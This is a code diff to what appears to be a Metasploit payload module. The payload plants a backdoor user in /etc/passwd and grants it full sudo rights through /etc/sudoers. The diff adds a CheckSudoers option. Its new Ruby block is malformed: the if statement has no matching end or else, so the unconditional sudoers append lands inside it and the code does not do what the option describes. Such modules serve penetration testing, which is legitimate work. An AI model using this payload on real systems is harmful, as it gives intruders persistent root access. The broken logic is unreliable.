@@ -45,7 +45,8 @@ module MetasploitModule
 
     register_advanced_options(
       [
-        OptEnum.new('RootMethod', [false, 'Set the method that the new user can obtain root', 'SUDO', ['SUID', 'SUDO', 'NONE']])
+        OptEnum.new('RootMethod', [false, 'Set the method that the new user can obtain root', 'SUDO', ['SUID', 'SUDO', 'NONE']]),
+        OptBool.new('CheckSudoers', [false, 'Add lines to only add to sudoers if file exists', true], conditions: %w[RootMethod == SUDO])
       ]
     )
   end
@@ -77,7 +78,9 @@ module MetasploitModule
            end
     payload_cmd = "echo \'#{user}:#{datastore['PASS'].crypt('Az')}:#{suid}:#{suid}::/:/bin/sh\'>>/etc/passwd"
     if datastore['RootMethod'] == 'SUDO'
-      payload_cmd += ";[ -f /etc/sudoers ]&&(echo \'#{user} ALL=(ALL:ALL) ALL\'>>/etc/sudoers)"
+      if datastore['CheckSudoers']
+        payload_cmd += ";[ -f /etc/sudoers ]&&(echo \'#{user} ALL=(ALL:ALL) ALL\'>>/etc/sudoers)"
+      payload_cmd += ";echo \'#{user} ALL=(ALL:ALL) ALL\'>>/etc/sudoers"
     end
     payload_cmd
   end
